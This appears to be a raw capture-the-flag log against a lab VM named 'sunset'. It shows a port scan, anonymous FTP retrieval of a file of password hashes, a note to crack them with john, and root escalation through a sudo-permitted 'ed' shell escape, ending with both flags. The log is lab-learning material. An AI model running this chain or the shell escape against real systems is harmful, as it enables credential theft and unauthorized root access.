@@ -1,0 +1,69 @@
+PORT   STATE SERVICE VERSION
+21/tcp open  ftp     pyftpdlib 1.5.5
+| ftp-syst: 
+|   STAT: 
+| FTP server status:
+|  Connected to: 192.168.56.127:21
+|  Waiting for username.
+|  TYPE: ASCII; STRUcture: File; MODE: Stream
+|  Data connection closed.
+|_End of status.
+| ftp-anon: Anonymous FTP login allowed (FTP code 230)
+|_-rw-r--r--   1 root     root         1062 Jul 29  2019 backup
+22/tcp open  ssh     OpenSSH 7.9p1 Debian 10 (protocol 2.0)
+
+└─$ ftp 192.168.56.127
+Connected to 192.168.56.127.
+220 pyftpdlib 1.5.5 ready.
+Name (192.168.56.127:ed): anonymous
+331 Username ok, send password.
+Password: 
+230 Login successful.
+Remote system type is UNIX.
+Using binary mode to transfer files.
+ftp> dir
+229 Entering extended passive mode (|||59395|).
+125 Data connection already open. Transfer starting.
+-rw-r--r--   1 root     root         1062 Jul 29  2019 backup
+
+ftp> fget backup
+Can't open source file backup
+ftp> get backup
+local: backup remote: backup
+229 Entering extended passive mode (|||46263|).
+125 Data connection already open. Transfer starting.
+100% |********************************************************************************|  1062      109.94 KiB/s    00:00 ETA
+226 Transfer complete.
+
+└─$ cat backup   
+CREDENTIALS:                                                                                                                                                                                                       
+office:$6$$9ZYTy.VI0M7cG9tVcPl.QZZi2XHOUZ9hLsiCr/avWTajSPHqws7.75I9ZjP4HwLN3Gvio5To4gjBdeDGzhq.X.                                                                                                                  
+datacenter:$6$$3QW/J4OlV3naFDbhuksxRXLrkR6iKo4gh.Zx1RfZC2OINKMiJ/6Ffyl33OFtBvCI7S4N1b8vlDylF2hG2N0NN/                                                                                                              
+sky:$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0                                                                                                                     
+sunset:$6$406THujdibTNu./R$NzquK0QRsbAUUSrHcpR2QrrlU3fA/SJo7sPDPbP3xcCR/lpbgMXS67Y27KtgLZAcJq9KZpEKEqBHFLzFSZ9bo/
+space:$6$$4NccGQWPfiyfGKHgyhJBgiadOlP/FM4.Qwl1yIWP28ABx.YuOsiRaiKKU.4A1HKs9XLXtq8qFuC3W6SCE4Ltx/  
+
+//it seems the content of shadow,try to john it, sunset first
+
+$6$$Ny8IwgIPYq5pHGZqyIXmoVRRmWydH7u2JbaTo.H2kNG7hFtR.pZb94.HjeTK1MLyBxw8PUeyzJszcwfH0qepG0
+
+
+
+sunset@sunset:~$ pwd
+/home/sunset
+sunset@sunset:~$ ls
+user.txt
+sunset@sunset:~$ cat user.txt
+5b5b8e9b01ef27a1cc0a2d5fa87d7190
+
+sunset@sunset:~$ sudo /usr/bin/ed
+ls
+?
+!/bin/bash
+root@sunset:/home/sunset# ls
+user.txt
+root@sunset:/home/sunset# cd /root
+root@sunset:~# ls
+flag.txt  ftp  server.sh
+root@sunset:~# cat flag.txt
+25d7ce0ee3cbf71efbac61f85d0c14fe
